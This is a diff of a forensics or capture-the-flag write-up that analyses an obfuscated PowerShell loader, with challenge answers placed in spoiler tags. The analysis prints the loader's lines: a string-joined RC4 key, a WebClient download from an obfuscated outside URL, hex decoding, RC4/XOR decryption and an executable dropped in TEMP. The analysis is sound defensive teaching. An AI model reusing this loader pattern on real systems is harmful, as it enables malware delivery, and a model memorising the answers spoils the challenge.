@@ -106,14 +106,14 @@ The third Verbose alert shows us the details of the script that is being run:
 This script is being obfuscated to attempt to avoid Intrusion Detection Systems(IDS) and to make the Forensic Analyst's job harder.
 >$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
   
-This piece of script is defining variable $k and using this UTF8 encoding function to concatinate these individual strings in an attempt to hide the true value of the key which is <details><summary>SPOILER</summary>**X9vT3pL2QwE8xR6ZkYhC4s**</details> and we will take note of this because we will likely use this key to decrypt payloads in our packet capture.  
+This piece of script is defining variable $k and using this UTF8 encoding function to concatinate these individual strings in an attempt to hide the true value of the key which is <details><summary>Question 3 SPOILER</summary>**X9vT3pL2QwE8xR6ZkYhC4s**</details> and we will take note of this because we will likely use this key to decrypt payloads in our packet capture.  
 >$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
 
 This piece of code is defining variable **$h** and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable.  
   
 A quick rundown is that **join()** will concatinate the individual strings, and **replace()** will delete any whitespace because **\s** is the RegEx for whitespace and it's replacing those with '' which is a blank string.  
 
-This is downloading the payload from **hxxp://api-edgecloud[.]xyz/amd[.]bin**  (NOTE: This is a defanged URL in order to protect people reading this report from inadvertantly going to the infected URL)
+This is downloading the payload from <details><summary>Question 1 SPOILER</summary>**hxxp://api-edgecloud[.]xyz/amd[.]bin**  (NOTE: This is a defanged URL in order to protect people reading this report from inadvertantly going to the infected URL)</details>
   
 >$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
   
@@ -149,8 +149,8 @@ Let's reformat this into something more readable than a long string of character
 >        $byte -bxor $s[($s[$i] + $s[$j]) % 256]
 >    }
 >````
-  This is taking the key we found earlier and convert it into a pseudo-randomized 256-byte vector that is used to encrypt and decrypt a payload. This is known as the RC4 Key-Scheduling Algorithm (KSA)  
-  We will take note of this because we will likely use this in Cyberchef later to help us decrypt payloads we find in the packet capture. One more note is that XOR is being used against the payload.
+  This is taking the key we found earlier and convert it into a pseudo-randomized 256-byte vector that is used to encrypt and decrypt a payload. This is known as the <details><summary>Question 2 SPOILER</summary>RC4 Key-Scheduling Algorithm (KSA)</details>  
+  We will take note of this because we will likely use this in Cyberchef later to help us decrypt payloads we find in the packet capture.
 
 >````
 >    $p = $env:TEMP + '\amdfendrsr.exe'
